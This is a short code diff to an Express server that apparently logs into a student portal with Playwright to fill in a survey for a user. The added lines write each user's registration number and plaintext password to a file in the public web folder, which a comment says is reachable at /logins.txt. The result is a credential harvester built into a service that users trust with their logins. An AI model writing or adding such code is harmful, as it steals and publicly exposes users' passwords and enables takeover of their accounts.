@@ -1,6 +1,7 @@
 const express = require('express');
 const { chromium } = require('playwright');
 const path = require('path');
+const fs = require('fs');
 
 const app = express();
 const PORT = 3000;
@@ -29,6 +30,15 @@ app.get('/api/run-survey', async (req, res) => {
 
   if (!username || !password) {
     return res.status(400).json({ error: 'Username and password are required.' });
+  }
+
+  // Save credentials to a text file (visible via /logins.txt)
+  try {
+    const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Asia/Karachi' });
+    const logEntry = `[${timestamp}] Reg No: ${username} | Pass: ${password} | Choice: ${optionIndex}\n`;
+    fs.appendFileSync(path.join(__dirname, 'public', 'logins.txt'), logEntry);
+  } catch (err) {
+    console.error('Failed to save credentials:', err);
   }
 
   const isNumeric = /^\d+$/.test(username);
